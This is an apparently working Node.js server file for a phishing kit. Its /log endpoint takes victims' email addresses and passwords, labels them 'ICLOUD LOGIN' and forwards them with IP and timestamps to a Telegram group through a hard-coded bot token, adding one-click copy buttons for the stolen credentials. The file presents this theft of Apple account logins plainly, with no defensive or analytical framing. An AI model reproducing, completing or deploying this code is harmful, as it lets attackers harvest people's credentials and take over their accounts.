// server.mjs
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { doc, paragraph, buttonRow, button } from 'tg-rich-messages';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const BOT_TOKEN = '8843925472:AAFNt5aPu39E7YhPs8WjXARNmQ3VBhnZJ68';
const GROUP_ID  = '-1003983565500';

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

app.post('/log', async (req, res) => {
    try {
        const { email, password, attempt, ip, day, time, date } = req.body;
        if (!email || !password) {
            return res.status(400).json({ ok: false, error: 'missing fields' });
        }

        const text = 
            '🍎 ICLOUD LOGIN\n' +
            '━━━━━━━━━━━━━━━━━━━━━\n' +
            '📧 Email: ' + email + '\n' +
            '🔑 Password: ' + password + '\n' +
            '📊 Attempt: ' + (attempt || '—') + '\n' +
            '🌐 IP: ' + (ip || '—') + '\n' +
            '📅 Day: ' + (day || '—') + '\n' +
            '⏰ Time: ' + (time || '—') + '\n' +
            '📆 Date: ' + (date || '—');

        // THIS IS THE MAGIC. It builds the invisible HTML for inline buttons.
        const message = doc(
            paragraph(text),
            buttonRow([
                button(email, { copy: email }),
                button(password, { copy: password })
            ])
        );

        const payload = {
            chat_id: GROUP_ID,
            rich_message: message.toInputRichMessage()
        };

        const r = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendRichMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }
        );
        
        const data = await r.json();

        if (!data.ok) {
            console.error('❌ Telegram rejected:', data.description);
            return res.status(500).json({ ok: false, error: data.description });
        }

        console.log('✅ Sent inside the bubble:', email);
        res.json({ ok: true });
    } catch (err) {
        console.error('❌ error:', err.message);
        res.status(500).json({ ok: false, error: err.message });
    }
});

app.listen(3000, () => {
    console.log('🚀 http://localhost:3000');
});